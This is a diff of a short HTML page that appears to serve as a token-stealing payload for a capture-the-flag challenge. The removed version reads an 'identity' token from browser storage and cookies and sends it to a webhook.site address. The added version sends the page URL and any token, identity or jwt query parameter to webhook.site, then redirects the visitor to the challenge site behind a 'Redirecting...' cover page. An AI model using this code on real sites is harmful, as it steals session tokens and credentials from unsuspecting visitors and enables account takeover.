@@ -1,21 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <script>
-        const token = 
-          localStorage.getItem('identity') || 
-          sessionStorage.getItem('identity') || 
-          (document.cookie.match(/identity=([^;]+)/) || [])[1];
-      
-        if (token) {
-          fetch("https://webhook.site/f6b76157-fb9a-4ad5-9bee-6b66b8918131?identity=" + encodeURIComponent(token));
-        }
-      </script>      
-</head>
+<html>
+<head><title>Redirecting...</title></head>
 <body>
-    hey
+<script>
+  // Log everything
+  fetch("https://webhook.site/YOUR_ID_HERE?" + document.location.href);
+
+  // Optionally decode JWT from URL and extract info
+  const params = new URLSearchParams(window.location.search);
+  const token = params.get("token") || params.get("identity") || params.get("jwt");
+
+  if (token) {
+    fetch("https://webhook.site/YOUR_ID_HERE?token=" + encodeURIComponent(token));
+  }
+
+  // Redirect back to legit site
+  window.location = "https://chal5.hackademy.ctf/";
+</script>
+<p>Redirecting...</p>
 </body>
 </html>
